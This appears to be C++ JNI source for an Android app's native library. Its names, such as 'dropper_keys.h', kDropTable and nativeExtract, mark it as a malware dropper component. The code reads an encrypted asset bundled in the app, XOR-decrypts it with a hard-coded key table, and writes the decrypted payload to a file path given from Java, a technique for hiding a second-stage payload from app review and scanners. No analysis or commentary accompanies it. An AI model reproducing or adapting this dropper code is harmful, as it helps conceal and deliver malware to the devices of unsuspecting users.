#include <jni.h>
#include <android/asset_manager.h>
#include <android/asset_manager_jni.h>
#include <cstring>
#include <string>
#include <vector>
#include "dropper_keys.h"

static std::vector<unsigned char> read_asset(AAssetManager *mgr, const char *name) {
    AAsset *asset = AAssetManager_open(mgr, name, AASSET_MODE_BUFFER);
    if (!asset) {
        return {};
    }
    const void *buf = AAsset_getBuffer(asset);
    off_t len = AAsset_getLength(asset);
    std::vector<unsigned char> out;
    if (buf && len > 0) {
        const auto *bytes = static_cast<const unsigned char *>(buf);
        out.assign(bytes, bytes + len);
    }
    AAsset_close(asset);
    return out;
}

static void xor_decrypt(const std::vector<unsigned char> &in, std::vector<unsigned char> &out) {
    out.resize(in.size());
    for (size_t i = 0; i < in.size(); i++) {
        out[i] = in[i] ^ kDropTable[i % kDropTable_len];
    }
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_pkg_loader_dispatch_internal_NativeBridge_nativeExtract(
    JNIEnv *env,
    jclass,
    jobject assetManager,
    jstring outPath) {
    AAssetManager *mgr = AAssetManager_fromJava(env, assetManager);
    if (!mgr) {
        return JNI_FALSE;
    }

    std::vector<unsigned char> enc = read_asset(mgr, kDropAssetName);
    if (enc.empty()) {
        return JNI_FALSE;
    }

    std::vector<unsigned char> plain;
    xor_decrypt(enc, plain);

    const char *path = env->GetStringUTFChars(outPath, nullptr);
    if (!path) {
        return JNI_FALSE;
    }

    FILE *fp = fopen(path, "wb");
    if (!fp) {
        env->ReleaseStringUTFChars(outPath, path);
        return JNI_FALSE;
    }
    size_t written = fwrite(plain.data(), 1, plain.size(), fp);
    fclose(fp);
    env->ReleaseStringUTFChars(outPath, path);

    return written == plain.size() ? JNI_TRUE : JNI_FALSE;
}
